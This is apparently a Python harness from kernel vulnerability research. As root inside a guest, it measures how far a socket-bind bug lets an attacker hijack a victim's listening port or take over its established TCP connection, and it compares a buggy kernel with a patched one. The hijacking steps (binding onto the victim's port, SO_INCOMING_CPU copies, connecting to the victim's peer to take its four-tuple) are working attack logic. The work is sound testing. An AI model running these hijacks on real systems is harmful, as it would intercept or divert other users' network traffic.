#!/usr/bin/env python3
"""Stage 2 of the attack matrix: what an attacker gets from the binds stage 1
found, measured with real traffic.

  usage: stage2.py OUTDIR CASES [--jobs N] [--kinds client,child] [--name N]
                                                  (as root, in the guest)

CASES is the stage-1 positives file of the kernel that has the bug; every
kernel runs the same cases, so the patched kernel is tested on exactly what
worked without the patch. For each victim, one case per distinct pair of
(socket held before the victim started, hijacking socket) is kept, using the
shortest sequence that reaches it, and for connection victims also every
socket an attacker can bind on its port without the bug.

Listener victims: the victim answers "V" and the attacker's listener "A".
Clients probe every address the host has: 10.9.0.1, fd09::1 and fe80::1 from
the peer, 127.0.0.1 and ::1 from this host. Each case runs twice, once with
the plain hijacking socket and once with a copy of it per CPU, each with
SO_INCOMING_CPU set, which raises its score in the listener lookup. Then the
victim is stopped and started again while the attacker still holds its
sockets.

Connection victims: the attacker connects from its socket to the victim's
peer, which gives it the victim's four-tuple if the kernel lets it. Then the
peer sends on the victim's connection, held by identity since before the
attack, and the result records whether the victim or the attacker received
it. A connection the attacker opened of its own instead of taking the
victim's is recorded separately, so the two are never confused.

Writes OUTDIR/stage2.jsonl.gz, or OUTDIR/<--name>.jsonl.gz.
"""

import argparse
import gzip
import json
import os
import select
import signal
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import env      # noqa: E402
import space    # noqa: E402
from stage1 import Ports, PEER_PORT, HIGH, LOW, Worker  # noqa: E402
from stage1 import check_port_plan, one_client_victim  # noqa: E402

PROBES = 6
# tcpi_segs_in in struct tcp_info: eight one-byte fields, then u32s to
# tcpi_total_retrans at 100, then four u64s, then tcpi_segs_out at 136.
SEGS_IN = 140
DESTS = [("peer", space.V4, space.HOST_V4, "-"),
         ("peer", space.V6, space.HOST_V6, "-"),
         ("peer", space.V6, space.HOST_LL, "vp"),
         ("local", space.V4, "127.0.0.1", "-"),
         ("local", space.V6, "::1", "-")]


def select_cases(path, alone_path):
    by_victim = {}
    with gzip.open(path, "rt") as f:
        for line in f:
            p = json.loads(line)
            key = (p["pre"], p["seq"][-1])
            best = by_victim.setdefault(p["victim"], {})
            if key not in best or len(p["seq"]) < len(best[key]["seq"]):
                best[key] = {"victim": p["victim"], "pre": p["pre"],
                             "seq": p["seq"], "why": "positive"}
    cases = []
    for v, best in sorted(by_victim.items()):
        cases += sorted(best.values(), key=lambda c: (c["pre"] is not None,
                                                      len(c["seq"]), c["seq"]))
    # For connection victims, also the sockets an attacker can bind on the
    # victim's port without the bug: one per distinct address and device.
    kinds = {v["id"]: v["kind"] for v in space.victims()}
    extra = {}
    with gzip.open(alone_path, "rt") as f:
        for line in f:
            a = json.loads(line)
            if (kinds.get(a["victim"]) in ("client", "child")
                    and a.get("bind") == "o" and a.get("pre") is None):
                fam, addr, v6only, dev, _, _ = space.ATTACKER_SOCKETS[a["socket"]]
                extra.setdefault(a["victim"], {}).setdefault(
                    (fam, addr, v6only, dev),
                    {"victim": a["victim"], "pre": None, "seq": [a["socket"]],
                     "why": "binds without the bug"})
    for v, by_shape in sorted(extra.items()):
        cases += list(by_shape.values())
    return cases


def segs_in(sock):
    """Segments this socket has been given, counted by the kernel before the
    sequence check and before any filter. A socket can take a connection's
    segments without recv() ever returning them, so this is what says whether
    the attacker got between the two ends; recv() only says whether it could
    also read what it took."""
    if sock is None:
        return None
    try:
        info = sock.getsockopt(socket.IPPROTO_TCP, socket.TCP_INFO,
                               SEGS_IN + 4)
    except OSError:
        return None
    if len(info) < SEGS_IN + 4:
        return None
    return struct.unpack_from("I", info, SEGS_IN)[0]


def serve(socks):
    """In a child process: answer every connection with the marker of the
    socket it arrived on, then wait for the client to close first."""
    markers = {s.fileno(): m for s, m in socks}
    by_fd = {s.fileno(): s for s, _ in socks}
    while True:
        r, _, _ = select.select(list(by_fd), [], [], 1)
        for fd in r:
            try:
                conn, _ = by_fd[fd].accept()
            except OSError:
                continue
            try:
                conn.sendall(markers[fd])
                conn.settimeout(1)
                conn.recv(16)
            except OSError:
                pass
            conn.close()


class Stage2(Worker):
    def __init__(self, job, args):
        super().__init__(job, args)
        self.local = env.Helper(None)
        self.cpus = os.cpu_count()

    def probe_all(self):
        out = {}
        for where, fam, addr, dev in DESTS:
            h = self.peer if where == "peer" else self.local
            r = h.cmd("probe", int(fam), addr, self.port, dev, PROBES)
            out[addr] = [int(x) for x in r[1:4]] if r[0] == "ok" else r
        return out

    def listener_run(self, case, v, copies):
        self.port = port = (self.low if v["kind"] == "low"
                            else self.high).next()
        mine, rec = [], {"case": case, "copies": copies}
        if case["pre"] is not None:
            with env.attacker():
                q, rec["squat"] = env.bind(
                    space.ATTACKER_SOCKETS[case["pre"]], port)
            mine.append(q)
        victim, rec["victim_codes"], target = self.make_victim(v, port)
        if target is None:
            env.reset_close(mine)
            rec["absent"] = True
            return rec
        listening = [(s, b"V") for s in victim]
        codes = []
        with env.attacker():
            seq = case["seq"]
            for n, idx in enumerate(seq):
                last = n == len(seq) - 1
                for c in range(copies if last else 1):
                    s, code = env.bind(space.ATTACKER_SOCKETS[idx], target)
                    if s is not None and last:
                        try:
                            if copies > 1:
                                s.setsockopt(socket.SOL_SOCKET,
                                             env.SO_INCOMING_CPU, c)
                            s.listen(64)
                            listening.append((s, b"A"))
                        except OSError as e:
                            code = env.code(e)
                    codes.append(code)
                    mine.append(s)
        rec["codes"] = codes
        pid = os.fork()
        if pid == 0:
            signal.signal(signal.SIGTERM, lambda *a: os._exit(0))
            serve(listening)
            os._exit(0)
        rec["probes"] = self.probe_all()
        os.kill(pid, signal.SIGTERM)
        os.waitpid(pid, 0)
        env.reset_close(victim)
        again, rec["restart"], _ = self.make_victim(v, port)
        env.reset_close(again + mine)
        return rec

    def baseline(self, v):
        """The victim alone: which addresses does it answer?"""
        self.port = port = (self.low if v["kind"] == "low"
                            else self.high).next()
        victim, codes, target = self.make_victim(v, port)
        if target is None:
            return None
        pid = os.fork()
        if pid == 0:
            signal.signal(signal.SIGTERM, lambda *a: os._exit(0))
            serve([(s, b"V") for s in victim])
            os._exit(0)
        out = self.probe_all()
        os.kill(pid, signal.SIGTERM)
        os.waitpid(pid, 0)
        env.reset_close(victim)
        return out

    def connection_run(self, case, v):
        # A dead connection from an earlier case on the same port number
        # must not be the one the peer sends on.
        self.peer.cmd("closeall")
        port = self.high.next()
        rec = {"case": case}
        k = v["kind"]
        if k == "client":
            victim, rec["victim_codes"], target = self.make_victim(v, port)
            if target is None:
                return rec
            vsock = victim[0]
            peer = vsock.getpeername()
            # Hold the victim's connection at the peer by identity. The
            # attacker can open its own connection from the same port with a
            # different local address, and that must not be mistaken for the
            # victim's when the peer sends.
            r = self.peer.cmd("grab", target)
            if r[0] != "ok":
                env.reset_close(victim)
                rec["victim_codes"] += "g"
                return rec
            conn_id, rec["peer_sees"] = r[1], r[2]
        else:
            dfam, daddr = v["dest"]
            socks, rec["victim_codes"], _ = self.make_victim(
                dict(v, kind="listener"), port)
            if not socks:
                return rec
            dev = "vp" if daddr in space.LINK_LOCAL else "-"
            self.tidy()
            r = self.peer.cmd("connect", int(dfam), daddr, port, dev)
            if r[0] != "ok":
                env.reset_close(socks)
                rec["victim_codes"] += "c"
                return rec
            conn_id = r[1]
            socks[0].settimeout(3)
            vsock, peer = socks[0].accept()
            victim, target = socks + [vsock], port
        codes, hijack = [], None
        with env.attacker():
            mine = []
            for idx in case["seq"]:
                s, c = env.bind(space.ATTACKER_SOCKETS[idx], target)
                codes.append(c)
                mine.append(s)
            hijack = mine[-1]
            if hijack is not None:
                dest = peer
                if hijack.family == socket.AF_INET6 and len(dest) == 2:
                    dest = ("::ffff:" + dest[0], dest[1], 0, 0)
                hijack.settimeout(2)
                if hijack.family == socket.AF_INET and len(dest) == 4:
                    rec["connect"] = "family"   # IPv4 socket, IPv6 peer
                else:
                    try:
                        hijack.connect(dest)
                        rec["connect"] = "o"
                    except OSError as e:
                        rec["connect"] = env.code(e) if e.errno else "timeout"
        rec["codes"] = codes
        if k == "client":
            # A connection the attacker opened of its own, rather than taking
            # the victim's: same port at this end, seen by the peer as well.
            r = self.peer.cmd("grab", target)
            rec["attacker_own_connection"] = r[2] if r[0] == "ok" else None
        before = (segs_in(vsock), segs_in(hijack))
        rec["peer_send"] = self.peer.cmd("send", conn_id, "PING")[0]
        vsock.settimeout(1.5)
        try:
            rec["victim_rx"] = len(vsock.recv(64))
        except OSError as e:
            rec["victim_rx"] = env.code(e) if e.errno else "timeout"
        rec["attacker_rx"] = 0
        if hijack is not None:
            hijack.settimeout(0.5)
            try:
                rec["attacker_rx"] = len(hijack.recv(64))
            except OSError:
                pass
        # Counted after both reads, so a segment the victim only got on a
        # retransmission still shows on whoever took it the first time.
        after = (segs_in(vsock), segs_in(hijack))
        rec["victim_segs"] = [before[0], after[0]]
        rec["attacker_segs"] = [before[1], after[1]]
        env.reset_close(mine + victim)
        return rec


def worker(job, args, cases, outdir):
    w = Stage2(job, args)
    victims = {v["id"]: v for v in space.victims()}
    out = gzip.open(os.path.join(outdir, "%s.part%d.gz" % (args.name, job)),
                    "wt")
    done = set()
    for n, case in enumerate(cases):
        v = victims[case["victim"]]
        try:
            if v["kind"] in ("client", "child"):
                with one_client_victim(v):
                    out.write(json.dumps(w.connection_run(case, v)) + "\n")
            else:
                if v["id"] not in done:
                    done.add(v["id"])
                    out.write(json.dumps({"baseline": v["id"],
                                          "probes": w.baseline(v)}) + "\n")
                for copies in (1, w.cpus):
                    out.write(json.dumps(w.listener_run(case, v, copies))
                              + "\n")
        except Exception as e:      # recorded, and the next case goes on
            out.write(json.dumps({"case": case, "error": repr(e)}) + "\n")
            print("job %d case %d: %r" % (job, n, e), file=sys.stderr)
        if (n + 1) % 25 == 0 or n + 1 == len(cases):
            p = os.path.join(outdir, "progress-%s.part%d" % (args.name, job))
            with open(p, "w") as f:
                f.write("%d/%d\n" % (n + 1, len(cases)))
    out.close()
    w.peer.stop()
    w.local.stop()
    os._exit(0)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("outdir")
    ap.add_argument("cases", help="stage1-positives.jsonl.gz of the kernel "
                                  "with the bug")
    ap.add_argument("--jobs", type=int, default=os.cpu_count())
    ap.add_argument("--three", type=int, default=0)
    ap.add_argument("--kinds", default="", help="only these victim kinds, "
                                                "comma separated")
    ap.add_argument("--name", default="stage2", help="name of the output file")
    ap.add_argument("--victims", default="", help="only these victim numbers")
    args = ap.parse_args()
    check_port_plan(args.jobs)
    os.makedirs(args.outdir, exist_ok=True)
    env.setup_network()
    alone = os.path.join(os.path.dirname(args.cases), "stage1-alone.jsonl.gz")
    cases = select_cases(args.cases, alone)
    if args.kinds:
        keep = set(args.kinds.split(","))
        kinds = {v["id"]: v["kind"] for v in space.victims()}
        cases = [c for c in cases if kinds[c["victim"]] in keep]
    if args.victims:
        only = {int(x) for x in args.victims.split(",")}
        cases = [c for c in cases if c["victim"] in only]
    # Keep each victim's cases on one worker, so its baseline runs once.
    groups = {}
    for c in cases:
        groups.setdefault(c["victim"], []).append(c)
    shares = [[] for _ in range(args.jobs)]
    for i, (v, lst) in enumerate(sorted(groups.items())):
        shares[i % args.jobs] += lst
    start = time.time()
    pids = []
    for j in range(args.jobs):
        pid = os.fork()
        if pid == 0:
            worker(j, args, shares[j], args.outdir)
        pids.append(pid)
    for pid in pids:
        os.waitpid(pid, 0)
    final = os.path.join(args.outdir, "%s.jsonl.gz" % args.name)
    with gzip.open(final, "wt") as out:
        for j in range(args.jobs):
            part = os.path.join(args.outdir, "%s.part%d.gz" % (args.name, j))
            with gzip.open(part, "rt") as f:
                for line in f:
                    out.write(line)
            os.unlink(part)
            os.unlink(os.path.join(args.outdir,
                                   "progress-%s.part%d" % (args.name, j)))
    print("%s: %d cases, %d s" % (args.name, len(cases), time.time() - start))


if __name__ == "__main__":
    main()
